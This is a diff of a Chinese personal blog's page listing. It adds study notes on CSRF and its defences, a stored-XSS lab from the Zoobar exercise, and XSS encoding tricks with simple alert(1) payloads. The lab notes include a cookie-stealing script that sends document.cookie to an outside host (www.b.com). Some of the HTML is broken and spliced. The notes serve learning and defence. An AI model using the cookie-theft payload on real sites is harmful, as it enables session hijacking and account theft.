-            <span class="post-category" >
-            
-              <span class="post-meta-divider">|</span>
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">分类于</span>
-              
-              
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/Vue/" itemprop="url" rel="index">
-                    <span itemprop="name">Vue</span>
-                  </a>
-                </span>
-
-                
-                
-              
-            </span>
-          
-
-          
-            
-          
-
-          
-          
-
-          
-
-          
-            <div class="post-wordcount">
-              
-                
-                <span class="post-meta-item-icon">
-                  <i class="fa fa-file-word-o"></i>
-                </span>
-                
-                  <span class="post-meta-item-text">字数统计&#58;</span>
-                
-                <span title="字数统计">
-                  411
-                </span>
-              
-
-              
-                <span class="post-meta-divider">|</span>
-              
-
-              
-                <span class="post-meta-item-icon">
-                  <i class="fa fa-clock-o"></i>
-                </span>
-                
-                  <span class="post-meta-item-text">阅读时长 &asymp;</span>
-                
-                <span title="阅读时长">
-                  1
-                </span>
-              
-            </div>
-          
-
-          
-
-        </div>
-      </header>
-    
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          <h1 id="computed和watch的区别"><a href="#computed和watch的区别" class="headerlink" title="computed和watch的区别"></a>computed和watch的区别</h1><h2 id="从属性名上分析"><a href="#从属性名上分析" class="headerlink" title="从属性名上分析"></a>从属性名上分析</h2><ul>
-<li>computed是一个计算属性，也就是依赖其他的属性计算所得出最后的值</li>
-<li><p>watch是去监听一个值的变化，然后执行相对应的函数。</p></li></ul>
-          <!--noindex-->
-          <div class="post-button text-center">
-            <a class="btn" href="/2018/09/03/Vue中watch和computed的区别/#more" rel="contents">
-              阅读全文 &raquo;
-            </a>
-          </div>
-          <!--/noindex-->
-        
-      
-    </div>
-    
-    
-    
-
-    
-    
-
-    
-
-    
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-    
-      
-
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/08/31/ES基础知识与高频考点梳理/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="小柯">
-      <meta itemprop="description" content="">
-      <meta itemprop="image" content="/images/xiaoke.jpg">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="小柯的博客">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h2 class="post-title" itemprop="name headline">
-                
-                <a class="post-title-link" href="/2018/08/31/ES基础知识与高频考点梳理/" itemprop="url">ES基础知识与高频考点梳理</a></h2>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">发表于</span>
-              
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-08-31T17:10:56+08:00">
-                2018-08-31
-              </time>
-            
-
-            
-
-            
-          </span>
-
-          
-            <span class="post-category" >
-            
-              <span class="post-meta-divider">|</span>
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">分类于</span>
-              
-              
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/面试题/" itemprop="url" rel="index">
-                    <span itemprop="name">面试题</span>
-                  </a>
-                </span>
-
-                
-                
-              
-            </span>
-          
-
-          
-            
-          
-
-          
-          
-
-          
-
-          
-            <div class="post-wordcount">
-              
-                
-                <span class="post-meta-item-icon">
-                  <i class="fa fa-file-word-o"></i>
-                </span>
-                
-                  <span class="post-meta-item-text">字数统计&#58;</span>
-                
-                <span title="字数统计">
-                  2,015
+                  2,226
                 </span>
               
 
@@ -1156,45 +887,398 @@
 
       
         
-          <h1 id="知识点梳理目录列表"><a href="#知识点梳理目录列表" class="headerlink" title="知识点梳理目录列表"></a>知识点梳理目录列表</h1><ul>
-<li>变量类型<ul>
-<li>JS的数据类型分类和判断</li>
-<li>值类型和引用类型</li>
+          
+            <h2 id="CSRF实验原理"><a href="#CSRF实验原理" class="headerlink" title="CSRF实验原理"></a>CSRF实验原理</h2><p>CSRF（Cross-Site Request Forgery，跨站点伪造请求）是一种网络攻击方式，该攻击可以在受害者毫不知情的情况下以受害者名义伪造请求发送给受攻击站点，从而在未授权的情况下执行在权限保护之下的操作，具有很大的危害性。具体来讲，可以这样理解CSRF攻击：攻击者盗用了你的身份，以你的名义发送恶意请求，对服务器来说这个请求是完全合法的，但是却完成了攻击者所期望的一个操作，比如以你的名义发送邮件、发消息，盗取你的账号，添加系统管理员，甚至于购买商品、虚拟货币转账等。</p>
+<h2 id="CSRF攻击原理"><a href="#CSRF攻击原理" class="headerlink" title="CSRF攻击原理"></a>CSRF攻击原理</h2><p>CSRF攻击原理比较简单，如图1所示。其中Web A为存在CSRF漏洞的网站，WebB为攻击者构建的恶意网站，User C为Web A网站的合法用户。</p>
+<p><img src="/images/CSRF攻击原理" alt="CSRF攻击原理"></p>
+<p>1、用户C打开浏览器，访问受信任网站A，输入用户名和密码请求登录网站A；</p>
+<p>2、在用户信息通过验证后，网站A产生Cookie信息并返回给浏览器，此时用户登录网站A成功，可以正常发送请求到网站A；</p>
+<p>3、用户未退出网站A之前，在同一浏览器中，打开一个TAB页访问网站B；</p>
+<p>4、网站B接收到用户请求后，返回一些攻击性代码，并发出一个请求要求访问第三方站点A；</p>
+<p>5、浏览器在接收到这些攻击性代码后，根据网站B的请求，在用户不知情的情况下携带Cookie信息，向网站A发出请求。网站A并不知道该请求其实是由B发起的，所以会根据用户C的Cookie信息以C的权限处理该请求，导致来自网站B的恶意代码被执行。</p>
+<h2 id="CSRF的防御"><a href="#CSRF的防御" class="headerlink" title="CSRF的防御"></a>CSRF的防御</h2><h3 id="1-验证HTTP-Referer字段"><a href="#1-验证HTTP-Referer字段" class="headerlink" title="1)验证HTTP Referer字段"></a>1)验证HTTP Referer字段</h3><p>根据HTTP协议，在HTTP头中有一个字段叫Referer，它记录了该HTTP请求的来源地址。在通常情况下，访问一个安全受限页面的请求必须来自于同一个网站。比如某银行的转账是通过用户访问<a href="http://bank.test/test?page=10&amp;userID=101&amp;money=10000页面完成，用户必须先登录bank.test，然后通过点击页面上的按钮来触发转账事件。当用户提交请求时，该转账请求的Referer值就会是转账按钮所在页面的URL（本例中，通常是以bank.test域名开头的地址）。而如果攻击者要对银行网站实施CSRF攻击，他只能在自己的网站构造请求，当用户通过攻击者的网站发送请求到银行时，该请求的Referer是指向攻击者的网站。因此，要防御CSRF攻击，银行网站只需要对于每一个转账请求验证其Referer值，如果是以bank" target="_blank" rel="noopener">http://bank.test/test?page=10&amp;userID=101&amp;money=10000页面完成，用户必须先登录bank.test，然后通过点击页面上的按钮来触发转账事件。当用户提交请求时，该转账请求的Referer值就会是转账按钮所在页面的URL（本例中，通常是以bank.test域名开头的地址）。而如果攻击者要对银行网站实施CSRF攻击，他只能在自己的网站构造请求，当用户通过攻击者的网站发送请求到银行时，该请求的Referer是指向攻击者的网站。因此，要防御CSRF攻击，银行网站只需要对于每一个转账请求验证其Referer值，如果是以bank</a>. test开头的域名，则说明该请求是来自银行网站自己的请求，是合法的。如果Referer是其他网站的话，就有可能是CSRF攻击，则拒绝该请求。</p>
+<h3 id="2-在请求中添加token并验证"><a href="#2-在请求中添加token并验证" class="headerlink" title="2)在请求中添加token并验证"></a>2)在请求中添加token并验证</h3><p>CSRF攻击之所以能够成功，是因为攻击者可以伪造用户的请求，该请求中所有的用户验证信息都存在于Cookie中，因此攻击者可以在不知道这些验证信息的情况下直接利用用户自己的Cookie来通过安全验证。由此可知，抵御CSRF攻击的关键在于：在请求中放入攻击者所不能伪造的信息，并且该信息不存在于Cookie之中。鉴于此，系统开发者可以在HTTP请求中以参数的形式加入一个随机产生的token，并在服务器端建立一个拦截器来验证这个token，如果请求中没有token或者token内容不正确，则认为可能是CSRF攻击而拒绝该请求。</p>
+<p>这种方法要比检查 Referer 要安全一些，token 可以在用户登陆后产生并放于 session 之中，然后在每次请求时把 token 从 session 中拿出，与请求中的 token 进行比对，但这种方法的难点在于如何把 token以参数的形式加入请求。对于 GET请求，token将附在请求地址之后，这样 URL就变成<a href="http://url?csrftoken=tokenvalue。而对于" target="_blank" rel="noopener">http://url?csrftoken=tokenvalue。而对于</a> POST请求来说，要在 form的最后加上 &lt;inputtype=”hidden” name=”csrftoken” value=”tokenvalue”/&gt;，这样就把 token以参数的形式加入请求了。但是，在一个网站中，可以接受请求的地方非常多，要对于每一个请求都加上 token 是很麻烦的，并且很容易漏掉，通常使用的方法就是在每次页面加载时，使用 javascript 遍历整个 dom 树，对于 dom 中所有的 a 和 form 标签后加入 token。这样可以解决大部分的请求，但是对于在页面加载之后动态生成的 html 代码，这种方法就没有作用，还需要程序员在编码时手动添加 token。</p>
+<p>实验基本思路就是1）启动session；2）在session中产生一个随机数，并且通过MD5或者其他散列函数进行散列；3)将session中生成的值放到表单中。4)在用户提交表单需要修改数据库的时候进行验证，用户提交的token是否和session中保存的token一致，只有一致的情况下，才进行数据库操作。</p>
+<p>1）启动session<br>session_start();</p>
+<p>2）在session中产生一个随机数<br>&lt;?php $_SESSION[‘csrf’]=md5(uniqid(mt_rand(),true)); ?&gt;</p>
+<p>3）将session中生成的值放在表单中这个值就是token</p>
+<input type="hidden" name="token" value="<?php echo $_SESSION['csrf']?>">
+
+
+<p>4）用户提交表单验证提交的token是否和session中保存的值一致</p>
+<p> if($_POST[‘submission’] &amp;&amp; $_SESSION[‘csrf’]==$_POST[‘token’]) </p>
+<p> XSS又称CSS，全称CrossSiteScript，跨站脚本攻击，是Web程序中常见的漏洞，XSS属于被动式且用于客户端的攻击方式，所以容易被忽略其危害性。其原理是攻击者向有 XSS漏洞的网站中输入(传入)恶意的HTML代码，当其它用户浏览该网站时，这段HTML代码会自动执行，从而达到攻击的目的。如，盗取用户 Cookie、破坏页面结构、重定向到其它网站等。</p>
+<p>XSS攻击类似于SQL注入攻击，攻击之前，我们先找到一个存在XSS漏洞的网站。理论上，所有可输入的地方没有对输入数据进行处理的话，都会存在XSS漏洞，漏洞的危害取决于攻击代码的威力。</p>
+<p>我们实验中的XSS代码会保存在数据库中，也称为Stored XSS，也即存储式XSS漏洞。由于其攻击代码作为合法的输入已经存储到服务器上的数据库中，其他人在访问该页面的时候，服务器会自动地从数据库中取出该攻击串返回给用户，然后用户的浏览器则会自动执行该段代码，因此，攻击者只需要在自己的页面中写上攻击代码，其他所有访问该页面的人都会受到攻击。</p>
+<p>实验步骤：</p>
+<p>第一步也即如何找到XSS漏洞。一般而言，如果网站某个用户输入点能够执行alert(1)，弹出一个框，也就证明这是一个XSS漏洞。</p>
+<p>为了执行JS，一般而言需要<script>或伪协议javascript:，但是Zoobar网站本身对<script>标签和javascript:都进行了过滤，为降低实验难度，允许本次实验对网站源码进行修改，从而可以执行XSS攻击。</p>
+<p>典型的测试代码：</p>
+<p>&lt;ahref=javascript:alert(1)&gt;hello</a></p>
+<script>alert（1）</script>
+
+
+
+</p><p>实验内容第一步包括steal cookie：</p>
+<p>典型攻击代码如：</p>
+<script>window.open(“www.b.com?param=”+document.cookie)</script>
+
+<p>此时只需要在<a href="http://www.b.com" target="_blank" rel="noopener">www.b.com</a> 写代码保存或者打印document.cookie值即可。</p>
+<p>譬如 php代码的echo $_GET[‘param’]；或者创建一个文件，将cookie的值保存下来。</p>
+<p>因为window本身也是重点过滤对象，所以可以考虑借助于img或a这种白名单上的标签。</p>
+<p><img>会自动向src网站发出请求，但是为了获得document.cookie的值而不是作为字符串将它发送出去，必须要在JS中使用img</p>
+<p>所以常见的做法是使用 document.write，自己写出来一个<img>标签,然后把document.cookie的值作为参数附在链接之后。</p>
+<p>从这里可以看出，使用JS可以实现HTML，从而也为接下来的攻击提供了思路。</p>
+<p>Javascript提供createElement()和appendchild()函数，它可以创建元素并将新创建的元素附在document对象中。因此，只要存在XSS漏洞可以执行JS代码，攻击者可以创建Form表单以及Form表单中的每一项input或textarea，也即可以模拟transfer zoobar和更改profile的动作，这样，所有访问攻击者页面的用户都会被攻击。</p>
+<p>XSS的防御：</p>
+<p>输入过滤，标签转换，HttpOnly防止偷cookie</p>
+
+          
+        
+      
+    </div>
+    
+    
+    
+
+    
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/09/17/多种跨域方案详解/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="小柯">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/xiaoke.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="小柯的博客">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h2 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2018/09/17/多种跨域方案详解/" itemprop="url">多种跨域方案详解</a></h2>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-09-17T11:30:30+08:00">
+                2018-09-17
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+            <div class="post-wordcount">
+              
+                
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-file-word-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">字数统计&#58;</span>
+                
+                <span title="字数统计">
+                  0
+                </span>
+              
+
+              
+                <span class="post-meta-divider">|</span>
+              
+
+              
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-clock-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">阅读时长 &asymp;</span>
+                
+                <span title="阅读时长">
+                  1
+                </span>
+              
+            </div>
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            
+          
+        
+      
+    </div>
+    
+    
+    
+
+    
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/09/17/xss学习笔记一/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="小柯">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/xiaoke.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="小柯的博客">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h2 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2018/09/17/xss学习笔记一/" itemprop="url">xss学习笔记一</a></h2>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-09-17T10:06:16+08:00">
+                2018-09-17
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/xss/" itemprop="url" rel="index">
+                    <span itemprop="name">xss</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+            <div class="post-wordcount">
+              
+                
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-file-word-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">字数统计&#58;</span>
+                
+                <span title="字数统计">
+                  0
+                </span>
+              
+
+              
+                <span class="post-meta-divider">|</span>
+              
+
+              
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-clock-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">阅读时长 &asymp;</span>
+                
+                <span title="阅读时长">
+                  1
+                </span>
+              
+            </div>
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <h2 id="同源策略"><a href="#同源策略" class="headerlink" title="同源策略"></a>同源策略</h2><p>思考题：<br>与<a href="https://segmentfault.com/index.html" target="_blank" rel="noopener">https://segmentfault.com/index.html</a></p>
+<ul>
+<li>1)<a href="https://segmentfault.com:80/lives" target="_blank" rel="noopener">https://segmentfault.com:80/lives</a></li>
+<li>2)<a href="https://www.segmentfault.com/index.php" target="_blank" rel="noopener">https://www.segmentfault.com/index.php</a></li>
+<li>3)<a href="http://segmentfault.com/test.html" target="_blank" rel="noopener">http://segmentfault.com/test.html</a></li>
+<li>4)<a href="https://segmentfault.com:443/lives" target="_blank" rel="noopener">https://segmentfault.com:443/lives</a></li>
+<li>5)data:text/html;,<html><body><script src="/live2dw/lib/L2Dwidget.min.js?0c58a1486de42ac6cc1c59c7d98ae887"></script><script>L2Dwidget.init({"log":false,"pluginJsPath":"lib/","pluginModelPath":"assets/","pluginRootPath":"live2dw/","tagMode":false});</script></body></html></li>
 </ul>
-</li>
-<li>原型与原型链(继承)<ul>
-<li>原型和原型链的定义</li>
-<li>继承写法</li>
-</ul>
-</li>
-<li>作用域和闭包<ul>
-<li>执行上下文</li>
-<li>this</li>
-<li>闭包是什么</li>
-</ul>
-</li>
-<li>异步<ul>
-<li>同步VS异步</li>
-<li>异步和单线程</li>
-<li>前端异步的场景</li>
-</ul>
-</li>
-<li>ES6/7新标准的考查<ul>
-<li>箭头函数</li>
-<li>module</li>
-<li>class</li>
-<li>set和map</li>
-<li>promise</li>
-</ul>
-</li>
-</ul>
-          <!--noindex-->
-          <div class="post-button text-center">
-            <a class="btn" href="/2018/08/31/ES基础知识与高频考点梳理/#more" rel="contents">
-              阅读全文 &raquo;
-            </a>
-          </div>
-          <!--/noindex-->
+<h2 id="xss的危害"><a href="#xss的危害" class="headerlink" title="xss的危害"></a>xss的危害</h2><p>2011.6.28,新浪微博受到xss蠕虫攻击<br>20:14,开始有大量带V的认证用户中招转发蠕虫<br>20:30,2kt.cn中的病毒页面无法访问<br>20:32,新浪微博中hellosamy中户无法访问<br>21:02,新浪漏洞修补完毕</p>
+<p>2011.3.26日起,GitHub受到ddos攻击<br>第一轮,百度统计的JS文件被劫持篡改,每2秒向GitHub上的两个页面发出请求,被Git胡U币的弹窗警告拦住<br>第二轮,跨网域<img>攻击,被GitHub<br>第三轮,DDOs攻击GitHub Pages</p>
+<h2 id="xss的成因"><a href="#xss的成因" class="headerlink" title="xss的成因"></a>xss的成因</h2><p>1、网页劫持,dns劫持,跳到假网站/页面/脚本被篡改,插入恶意代码<br>2、缓存投毒访问A站点时,加载了B站点的通用脚本,缓存时间非常长。再访问B站点时中招<br>3、文件投毒,在非官方站点下载了某个库;官方下载地址被攻击;迅雷网络加速缓存了错误的文件;引用了不可信的第三方dns上的资源<br>4、客户端投毒,被安装了恶意插件(尤其是chrome插件)<br>5、自身安全漏洞造成猥琐绕过,产生反射型和存储型xss</p>
+<h2 id="解决方案"><a href="#解决方案" class="headerlink" title="解决方案"></a>解决方案</h2><p>1、网页劫持,dns劫持,跳到假网站/页面/脚本被篡改,插入恶意代码https,工信部投诉<br>2、缓存投毒,访问A站点时,加载了B站点的通用脚本,缓存时间非常长。再访问B站点时中招 (网站:https  个人:连公共热点全程npn)<br>3、文件投毒,在非官方站点下载了某个库;官方下载地址被攻击;迅雷网络加速缓存了错误的文件;引用了不可信的第三方dns上的资源  (去官网下载  只使用可靠资源)<br>4、客户端投毒,被安装了恶意插件(尤其是chrome插件) (谨慎筛选插件  异站异密  二次验证)<br>5、自身安全漏洞造成猥琐绕过,产生反射型和存储型xss</p>
+<h2 id="编码"><a href="#编码" class="headerlink" title="编码"></a>编码</h2><h2 id="HTML编码"><a href="#HTML编码" class="headerlink" title="HTML编码"></a>HTML编码</h2><p>十进制：&#60;&#62;<br>十六进制：&#x3c;&#x3e;<br>别名：&lt;&gt;&copy;&newLine;&amp;color</p>
+<h2 id="JavaScript编码"><a href="#JavaScript编码" class="headerlink" title="JavaScript编码"></a>JavaScript编码</h2><p>八进制:\141\154\145\162\50\51<br>十六进制:</p>
+<h2 id="url编码"><a href="#url编码" class="headerlink" title="url编码"></a>url编码</h2><p>[encodeURI/decodeURI]<br>[encodeURIComponent/decodeURIComponent]</p>
+<h2 id="base64编码"><a href="#base64编码" class="headerlink" title="base64编码"></a>base64编码</h2><p>&lt;a href=data:text/html;base64,PGLtZyB&gt;</p>
+<h2 id="成因"><a href="#成因" class="headerlink" title="成因"></a>成因</h2><p>1、提前闭合标签<br>2、注释后续代码</p>
+<p><img src="https://segmentfault.com/favicon.ico" alt=""></p>
+<p>1、此处可以插入任意空格、回车、/<br>2、可以是http https ftp mailto data javascript vbscript //…各种协议的url<br>3、可以是双引号、单引号、也可以是没有引号，在IE中可以是反引号<br>4、任意的JS，能直接访问document作用域，字符可以被HTML转译</p>
+<h2 id="Payload-有效荷载"><a href="#Payload-有效荷载" class="headerlink" title="Payload(有效荷载)"></a>Payload(有效荷载)</h2><p>1、<input onfocus="write(1)" autofocus><br>2、<img src="" onerror="alert(1)"><br>3、<svg onload="alert(1)"><br/>4、<script>alert(1)</script><br/>5、<a href="javascript:alert(1)" target="_blank" rel="noopener">clickme</a></svg></p>
+
+          
         
       
     </div>
@@ -1233,7 +1317,7 @@
 
   
   <nav class="pagination">
-    <a class="extend prev" rel="prev" href="/"><i class="fa fa-angle-left"></i></a><a class="page-number" href="/">1</a><span class="page-number current">2</span><a class="page-number" href="/page/3/">3</a><span class="space">&hellip;</span><a class="page-number" href="/page/6/">6</a><a class="extend next" rel="next" href="/page/3/"><i class="fa fa-angle-right"></i></a>
+    <a class="extend prev" rel="prev" href="/"><i class="fa fa-angle-left"></i></a><a class="page-number" href="/">1</a><span class="page-number current">2</span><a class="page-number" href="/page/3/">3</a><span class="space">&hellip;</span><a class="page-number" href="/page/14/">14</a><a class="extend next" rel="next" href="/page/3/"><i class="fa fa-angle-right"></i></a>
   </nav>
 
 
@@ -1283,7 +1367,7 @@
               
                 <a href="/archives/">
               
-                  <span class="site-state-item-count">28</span>
+                  <span class="site-state-item-count">68</span>
                   <span class="site-state-item-name">日志</span>
                 </a>
               </div>
@@ -1294,7 +1378,7 @@
               
               <div class="site-state-item site-state-categories">
                 <a href="/categories/index.html">
-                  <span class="site-state-item-count">12</span>
+                  <span class="site-state-item-count">18</span>
                   <span class="site-state-item-name">分类</span>
                 </a>
               </div>
@@ -1305,7 +1389,7 @@
               
               <div class="site-state-item site-state-tags">
                 <a href="/tags/index.html">
-                  <span class="site-state-item-count">35</span>
+                  <span class="site-state-item-count">75</span>
                   <span class="site-state-item-name">标签</span>
                 </a>
               </div>
@@ -1390,7 +1474,7 @@
     <footer id="footer" class="footer">
       <div class="footer-inner">
         <script async src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script>
-<div class="copyright">&copy; 2017 &mdash; <span itemprop="copyrightYear">2018</span>
+<div class="copyright">&copy; 2017 &mdash; <span itemprop="copyrightYear">2019</span>
   <span class="with-love">
   <i class="fa fa-star"></i>
     <!-- <i class="fa fa-user"></i>-->
@@ -1421,7 +1505,7 @@
 -->
 <div class="theme-info">
   <div class="powered-by"></div>
-  <span class="post-count">博客全站共68.0k字</span>
+  <span class="post-count">博客全站共97.6k字</span>
 </div>
         
 
